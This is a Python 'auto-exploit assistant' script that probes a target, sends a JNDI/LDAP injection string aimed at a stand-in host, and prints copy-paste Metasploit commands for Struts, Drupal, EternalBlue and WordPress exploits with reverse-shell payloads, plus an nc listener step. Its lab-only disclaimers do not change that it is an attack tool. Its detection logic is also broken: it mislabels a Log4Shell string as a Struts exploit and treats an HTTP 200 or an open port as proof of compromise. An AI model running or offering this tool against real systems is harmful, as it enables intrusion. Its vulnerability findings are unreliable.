import requests
import socket
import re
from urllib.parse import urlparse
from colorama import init, Fore, Style

init(autoreset=True)


def detect_vulnerabilities(target):

    print(f"\n{Fore.CYAN}[→] Scanning target for known vulnerabilities...{Style.RESET_ALL}")

    vulns = []


    try:
        headers = {'Content-Type': '${jndi:ldap://bogus.example.com:1389/a}'}
        resp = requests.get(target, headers=headers, timeout=8, verify=False)
        if resp.status_code == 200:
            vulns.append({
                'cve': 'CVE-2017-5638',
                'name': 'Apache Struts2 RCE',
                'module': 'exploit/multi/http/struts2_content_type_ognl',
                'risk': 'CRITICAL'
            })
    except:
        pass


    try:
        resp = requests.get(f"{target}/user/register", timeout=8, verify=False)
        if 'drupal' in resp.text.lower() and 'user/register' in resp.text:
            vulns.append({
                'cve': 'CVE-2018-7600',
                'name': 'Drupalgeddon2 RCE',
                'module': 'exploit/unix/webapp/drupal_drupalgeddon2',
                'risk': 'CRITICAL'
            })
    except:
        pass


    try:
        hostname = urlparse(target).hostname
        port = urlparse(target).port or 443
        if hostname:
            context = __import__('ssl').create_default_context()
            context.check_hostname = False
            context.verify_mode = __import__('ssl').CERT_NONE
            with socket.create_connection((hostname, port), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    ssl_ver = ssock.version()
                    if ssl_ver in ['TLSv1', 'TLSv1.1']:
                        vulns.append({
                            'cve': 'CVE-2014-0160',
                            'name': 'Heartbleed (SSLv3/TLSv1)',
                            'module': 'auxiliary/scanner/ssl/openssl_heartbleed',
                            'risk': 'HIGH'
                        })
    except:
        pass


    try:
        hostname = urlparse(target).hostname or target.split(':')[0].split('/')[0]

        try:
            socket.inet_aton(hostname)
            is_ip = True
        except socket.error:
            is_ip = False

        if is_ip:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((hostname, 445))
            sock.close()
            if result == 0:
                vulns.append({
                    'cve': 'CVE-2017-0144',
                    'name': 'EternalBlue (SMB RCE)',
                    'module': 'exploit/windows/smb/ms17_010_eternalblue',
                    'risk': 'CRITICAL'
                })
    except:
        pass


    try:
        resp = requests.get(f"{target}/wp-login.php", timeout=8, verify=False)
        if 'wordpress' in resp.text.lower():
            vulns.append({
                'cve': 'N/A',
                'name': 'WordPress Installation',
                'module': 'exploit/unix/webapp/wp_admin_shell_upload',
                'risk': 'MEDIUM'
            })
    except:
        pass

    if vulns:
        print(f"{Fore.GREEN}[✓] Found {len(vulns)} potential vulnerability(ies){Style.RESET_ALL}")
    else:
        print(f"{Fore.YELLOW}[i] No known vulnerabilities detected (limited safe scanning){Style.RESET_ALL}")
        print(f"{Fore.CYAN}[i] For comprehensive testing, use dedicated vulnerability scanners{Style.RESET_ALL}")

    return vulns


def generate_metasploit_commands(vulns, target):

    print(f"\n{Fore.CYAN}{'=' * 70}")
    print(f"{Fore.CYAN}METASPLOIT COMMAND GENERATOR (MANUAL EXECUTION REQUIRED)")
    print(f"{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}")

    if not vulns:
        print(f"\n{Fore.YELLOW}[i] No vulnerabilities to generate commands for{Style.RESET_ALL}")
        return

    hostname = urlparse(target).hostname or target.split(':')[0].split('/')[0]
    port = urlparse(target).port or (443 if target.startswith('https') else 80)

    for i, vuln in enumerate(vulns, 1):
        print(f"\n{Fore.MAGENTA}{'─' * 70}")
        print(f"{Fore.MAGENTA}VULNERABILITY #{i}: {vuln['name']} ({vuln['cve']})")
        print(f"{Fore.MAGENTA}{'─' * 70}{Style.RESET_ALL}")
        print(f"Risk Level: {Fore.RED if vuln['risk'] == 'CRITICAL' else Fore.YELLOW}{vuln['risk']}{Style.RESET_ALL}")
        print(f"Metasploit Module: {Fore.CYAN}{vuln['module']}{Style.RESET_ALL}")


        commands = []
        commands.append(f"\n{Fore.GREEN}# ── COPY/PASTE THESE COMMANDS INTO msfconsole ──{Style.RESET_ALL}")

        if 'struts' in vuln['module'].lower():
            commands.append(f"use {vuln['module']}")
            commands.append(f"set RHOSTS {hostname}")
            commands.append(f"set RPORT {port}")
            commands.append(f"set TARGETURI /")
            commands.append(f"set PAYLOAD linux/x86/meterpreter/reverse_tcp")
            commands.append(f"set LHOST YOUR_PUBLIC_IP  # ← REPLACE WITH YOUR LISTENER IP")
            commands.append(f"set LPORT 4444")
            commands.append(f"exploit")

        elif 'drupal' in vuln['module'].lower():
            commands.append(f"use {vuln['module']}")
            commands.append(f"set RHOSTS {hostname}")
            commands.append(f"set RPORT {port}")
            commands.append(f"set TARGETURI /")
            commands.append(f"set PAYLOAD php/meterpreter/reverse_tcp")
            commands.append(f"set LHOST YOUR_PUBLIC_IP  # ← REPLACE WITH YOUR LISTENER IP")
            commands.append(f"set LPORT 4444")
            commands.append(f"exploit")

        elif 'heartbleed' in vuln['module'].lower():
            commands.append(f"use {vuln['module']}")
            commands.append(f"set RHOSTS {hostname}")
            commands.append(f"set RPORT {port}")
            commands.append(f"run")

        elif 'eternalblue' in vuln['module'].lower():
            commands.append(f"use {vuln['module']}")
            commands.append(f"set RHOSTS {hostname}")
            commands.append(f"set PAYLOAD windows/x64/meterpreter/reverse_tcp")
            commands.append(f"set LHOST YOUR_PUBLIC_IP  # ← REPLACE WITH YOUR LISTENER IP")
            commands.append(f"set LPORT 4444")
            commands.append(f"exploit")

        elif 'wordpress' in vuln['module'].lower():
            commands.append(f"use {vuln['module']}")
            commands.append(f"set RHOSTS {hostname}")
            commands.append(f"set RPORT {port}")
            commands.append(f"set TARGETURI /")
            commands.append(f"set PAYLOAD php/meterpreter/reverse_tcp")
            commands.append(f"set LHOST YOUR_PUBLIC_IP  # ← REPLACE WITH YOUR LISTENER IP")
            commands.append(f"set LPORT 4444")
            commands.append(f"exploit")


        for cmd in commands:
            print(cmd)

        print(f"\n{Fore.YELLOW}⚠️  CRITICAL SAFETY INSTRUCTIONS:{Style.RESET_ALL}")
        print(f"   1. {Fore.RED}ALWAYS{Style.RESET_ALL} replace 'YOUR_PUBLIC_IP' with YOUR actual listener IP")
        print(f"   2. {Fore.RED}NEVER{Style.RESET_ALL} use public cloud IPs (AWS/Azure) without explicit authorization")
        print(f"   3. {Fore.RED}ALWAYS{Style.RESET_ALL} test listener connectivity BEFORE exploitation:")
        print(f"        nc -nvlp 4444  # Verify reverse shell works")
        print(f"   4. {Fore.GREEN}ISOLATE{Style.RESET_ALL} testing network (VirtualBox NAT or dedicated VPS)")
        print(f"   5. {Fore.GREEN}DOCUMENT{Style.RESET_ALL} all commands executed with timestamps")


def run():
    print(f"\n{Fore.CYAN}{'=' * 70}")
    print(f"{Fore.CYAN}║{Fore.GREEN}          AUTO-EXPLOIT ASSISTANT (EDUCATIONAL ONLY)              {Fore.CYAN}║")
    print(f"{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}")
    print(f"\n{Fore.YELLOW}⚠️  THIS TOOL ONLY GENERATES METASPLOIT COMMANDS{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}⚠️  IT NEVER EXECUTES EXPLOITS AUTOMATICALLY{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}⚠️  YOU MUST MANUALLY REVIEW AND EXECUTE COMMANDS IN msfconsole{Style.RESET_ALL}")
    print(f"\n{Fore.CYAN}✅ SUPPORTED TARGETS:{Style.RESET_ALL}")
    print(f"   • HackTheBox machines (public IPs)")
    print(f"   • TryHackMe rooms (public IPs)")
    print(f"   • VulnHub VMs (any IP)")
    print(f"   • Your own vulnerable machines (any IP)")
    print(f"   • Docker containers (localhost or public VPS)")
    print(f"\n{Fore.RED}❌ NEVER TARGET:{Style.RESET_ALL}")
    print(f"   • Production systems without written contract")
    print(f"   • Systems owned by others without explicit permission")
    print(f"   • Government/military infrastructure")
    print(f"   • Critical infrastructure (power grids, hospitals)")

    target = input(
        f"\n{Fore.YELLOW}Enter target URL/IP (e.g., http://10.10.10.10 or 10.10.10.10): {Style.RESET_ALL}").strip()

    if not target:
        print(f"\n{Fore.RED}[!] Empty input. Aborting.{Style.RESET_ALL}")
        input(f"\n{Fore.BLUE}Press Enter to return to menu...{Style.RESET_ALL}")
        return


    if not target.startswith(('http://', 'https://')):

        if ':' in target and not target.replace('.', '').replace(':', '').isdigit():

            target = f"http://{target}"
        elif '.' in target.split(':')[0]:

            target = f"http://{target}"
        else:

            target = f"http://localhost:{target}"


    print(f"\n{Fore.CYAN}[+] Starting vulnerability assessment for: {target}{Style.RESET_ALL}")


    vulns = detect_vulnerabilities(target)


    generate_metasploit_commands(vulns, target)

    print(f"\n{Fore.CYAN}{'=' * 70}")
    print(f"{Fore.GREEN}[✓] Command generation completed (NO EXPLOITS EXECUTED){Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'=' * 70}{Style.RESET_ALL}")
    print(f"\n{Fore.YELLOW}💡 NEXT STEPS FOR PUBLIC TARGETS (HTB/TryHackMe/VulnHub):{Style.RESET_ALL}")
    print(f"   1. Start Metasploit listener on YOUR machine:")
    print(f"        msfconsole")
    print(f"        use exploit/multi/handler")
    print(f"        set PAYLOAD ... (match payload from commands above)")
    print(f"        set LHOST YOUR_VPN_IP  # HTB/TryHackMe require VPN")
    print(f"        set LPORT 4444")
    print(f"        run")
    print(f"\n   2. In SEPARATE msfconsole, paste generated commands")
    print(f"\n   3. {Fore.RED}CRITICAL FOR HTB/TryHackMe:{Style.RESET_ALL}")
    print(f"        • Use ONLY your assigned HTB/TryHackMe VPN IP as LHOST")
    print(f"        • Never use your real public IP (violates ToS)")
    print(f"        • Never scan/attack machines outside your assigned scope")
    print(f"        • Violations = permanent ban + possible legal action")


if __name__ == "__main__":
    try:
        requests.packages.urllib3.disable_warnings()
        run()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.RED}[!] Operation interrupted by user.{Style.RESET_ALL}")
        input(f"\n{Fore.BLUE}Press Enter to return to menu...{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        import traceback

        traceback.print_exc()
        input(f"\n{Fore.BLUE}Press Enter to return to menu...{Style.RESET_ALL}")